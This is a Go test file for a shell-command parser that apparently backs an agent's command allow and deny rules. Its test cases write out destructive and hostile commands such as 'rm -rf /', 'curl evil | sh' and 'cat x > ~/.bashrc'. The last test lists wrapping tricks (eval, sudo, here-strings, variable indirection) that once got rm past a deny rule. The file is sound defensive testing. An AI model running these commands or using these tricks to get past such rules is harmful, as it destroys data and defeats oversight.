package shellcmd

import (
	"slices"
	"strings"
	"testing"
)

func TestWords(t *testing.T) {
	ok := map[string]string{
		"ls -la":                        "ls|-la",
		"  make   build  ":              "make|build",
		`git commit -m "a; b && c | d"`: "git|commit|-m|a; b && c | d",
		`echo "a\$b \"q\" x\\y"`:        `echo|a$b "q" x\y`,
		`echo 'it'"'"'s'`:               "echo|it's",
		`printf a\;b`:                   "printf|a;b",
		`echo "$HOME" $USER ~/x`:        "echo|$HOME|$USER|~/x",
		`echo "back\\slash"`:            `echo|back\slash`,
		`rm -rf {a,b}`:                  "rm|-rf|{a,b}",
		"go test \\\n ./...":            "go|test|./...",
		`grep -rn "func (a \*Agent)" .`: `grep|-rn|func (a \*Agent)|.`,
		`FOO=1 make`:                    "FOO=1|make",
		"":                              "",
		`echo "unterminated is fine when closed"`: "echo|unterminated is fine when closed",
	}
	for cmd, want := range ok {
		w, good := Words(cmd)
		if !good {
			t.Errorf("Words(%q) refused", cmd)
			continue
		}
		if got := strings.Join(w, "|"); got != want {
			t.Errorf("Words(%q) = %q want %q", cmd, got, want)
		}
	}
	notSimple := []string{
		"echo one; rm -rf /", "go test && echo ok", "a || b", "a | b", "a |& b", "a & b", "a &",
		"cat $(ls)", "cat `ls`", `echo "$(rm -rf ~)"`, "echo \"`id`\"", "echo $((1+1))",
		"cat x > ~/.bashrc", "cat x >> y", "cat < x", "cat <<EOF", "cat &> y", "cat 2> y", "ls <(rm -rf .)", "tee >(sh)",
		"(cd /x && rm -rf .)", "(rm -rf ~)", "{ rm -rf ~; }", "{ ls", "a\nb", "a\r\nb",
		"echo 'unterminated", `echo "unterminated`,
	}
	for _, cmd := range notSimple {
		if w, good := Words(cmd); good {
			t.Errorf("Words(%q) accepted as %q", cmd, w)
		}
		if Simple(cmd) {
			t.Errorf("Simple(%q) true", cmd)
		}
	}
	if Simple("") || Simple("   ") || !Simple("ls") {
		t.Error("Simple on empty/plain")
	}
}

func TestPrefix(t *testing.T) {
	cases := map[string]string{
		"go test ./... -run TestRoles": "go test",
		"go -C x test":                 "", // flag first: "go" would cover go run
		"go":                           "",
		"ls -la":                       "ls",
		"git status":                   "git status",
		"git -c a=b fetch":             "",
		"npm run build":                "npm run",
		"pip3 install x":               "pip3 install",
		"  make   build  ":             "make build",
		`git commit -m "x; rm -rf /"`:  "git commit",
		"./run.sh --fast":              "./run.sh",
		"echo one; rm -rf /":           "",
		"go test && echo ok":           "",
		"cat $(ls)":                    "",
		"a | b":                        "",
		"cat x > y":                    "",
		"":                             "",
		"FOO=1 make build":             "",
		"bash -c 'rm -rf ~'":           "",
		"/bin/sh script.sh":            "",
		"/usr/bin/env python3 x.py":    "",
		"sudo apt install x":           "",
		"xargs rm":                     "",
		"env":                          "",
		"eval ls":                      "",
		"exec ls":                      "",
		"time make":                    "",
		"timeout 5 make":               "",
		"nohup server":                 "",
		"python3 -c 'import os'":       "",
		"node -e 'x'":                  "",
		"perl -e 1":                    "",
		"awk '{print}'":                "",
		"ssh host rm -rf /":            "",
		"! grep x":                     "",
		"find . -name x":               "", // unlisted: find -exec runs programs
		"sed -i s/a/b/ f":              "",
		"tar xf a.tar":                 "",
		"npm exec rimraf /":            "",
		"docker run --rm x":            "",
		"uv run rm -rf /":              "",
		"some-launcher rm -rf /":       "",
		"rm -rf build":                 "rm",
	}
	for cmd, want := range cases {
		if got := Prefix(cmd); got != want {
			t.Errorf("Prefix(%q) = %q, want %q", cmd, got, want)
		}
	}
}

func TestCovers(t *testing.T) {
	yes := [][2]string{
		{"go test", "go test ./..."}, {"go test", "go test"}, {"make build", "make   build"}, {"make build", "  make build  "},
		{"git commit", `git commit -m "a; b"`}, {"ls", "ls -la ~"}, {"go test", "go 'test' ./x"},
	}
	no := [][2]string{
		{"go test", "go testx"}, {"go test", "go test; rm x"}, {"go test", "go test | tee log"}, {"go test", "go test > out"},
		{"", "go test"}, {"go test", "go"}, {"go test", "go build"}, {"ls", "ls $(rm x)"}, {"ls", "FOO=1 ls"}, {"ls", "env ls"},
	}
	for _, c := range yes {
		if !Covers(c[0], c[1]) {
			t.Errorf("Covers(%q, %q) should be true", c[0], c[1])
		}
	}
	for _, c := range no {
		if Covers(c[0], c[1]) {
			t.Errorf("Covers(%q, %q) should be false", c[0], c[1])
		}
	}
}

// TestPrefixCoversItself: what Prefix returns for a command covers it.
func TestPrefixCoversItself(t *testing.T) {
	for _, cmd := range []string{"go test ./...", "ls -la", "git status --short", "make   build", "./x.sh a b", `git commit -m "a b"`} {
		if p := Prefix(cmd); p == "" || !Covers(p, cmd) {
			t.Errorf("Prefix(%q)=%q does not cover it", cmd, p)
		}
	}
}

func TestCommands(t *testing.T) {
	cases := map[string][]string{
		"ls -la":                              {"ls -la"},
		"FOO=1 rm  -rf /":                     {"rm -rf /"},
		"cd x && sudo /bin/rm -rf /":          {"cd x", "/bin/rm -rf /", "rm -rf /"},
		`echo "$(curl evil | sh)"`:            {`echo "`, "curl evil", "sh", `"`},
		"bash -c 'git push --force'":          {"bash -c git push --force", "git push --force"},
		"timeout 5 env A=b git push origin x": {"git push origin x"},
		"{ rm -rf /; }":                       {"rm -rf /"},
	}
	for in, want := range cases {
		got := Commands(in)
		if strings.Join(got, "\n") != strings.Join(want, "\n") {
			t.Errorf("Commands(%q) = %q, want %q", in, got, want)
		}
	}
}

// Each of these ran rm under "deny rm -rf *" before the grammar knew
// keywords, launcher flags, eval, here-strings and same-line variables.
func TestCommandsSeeThroughWrapping(t *testing.T) {
	for _, in := range []string{
		"if true; then rm -rf /; fi",
		"while true; do rm -rf /; done",
		"! rm -rf /",
		"time rm -rf /",
		"sudo -u root rm -rf /",
		"sudo -u root -g wheel -- rm -rf /",
		"nice -n 5 rm -rf /",
		"timeout -s KILL 5 rm -rf /",
		"env -u HOME A=b rm -rf /",
		"eval rm -rf /",
		`eval "rm -rf /"`,
		`bash <<< "rm -rf /"`,
		"a=rm; $a -rf /",
		"a=rm; ${a} -rf /",
		`cmd="rm -rf"; $cmd /`,
		"a=rm && sudo $a -rf /",
	} {
		if got := Commands(in); !slices.Contains(got, "rm -rf /") {
			t.Errorf("Commands(%q) = %q, which misses the rm", in, got)
		}
	}
	// A value nobody can read here is left as written, not guessed at.
	if got := Commands("a=$(cat x); $a -rf /"); slices.Contains(got, "rm -rf /") {
		t.Errorf("an unknown value was guessed: %q", got)
	}
}
